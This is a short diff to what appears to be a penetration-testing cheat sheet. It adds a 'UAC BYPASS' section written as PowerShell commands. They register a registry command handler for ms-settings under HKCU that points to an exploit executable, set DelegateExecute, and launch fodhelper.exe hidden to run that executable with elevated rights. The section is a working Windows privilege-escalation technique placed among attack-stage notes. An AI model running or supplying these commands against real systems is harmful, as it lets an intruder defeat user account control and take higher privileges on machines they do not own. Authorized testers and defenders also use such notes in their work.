@@ -889,6 +889,13 @@ python3 exploit.py
 # Check user and groups
 whoami
 net user {USERNAME}
+
+# UAC BYPASS
+ New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value {C:\Path\to\Exploit\exploit.exe} -Force
+New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
+cmd -> fodhelper
+
+powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden
 ```
 
 #### Credential Access
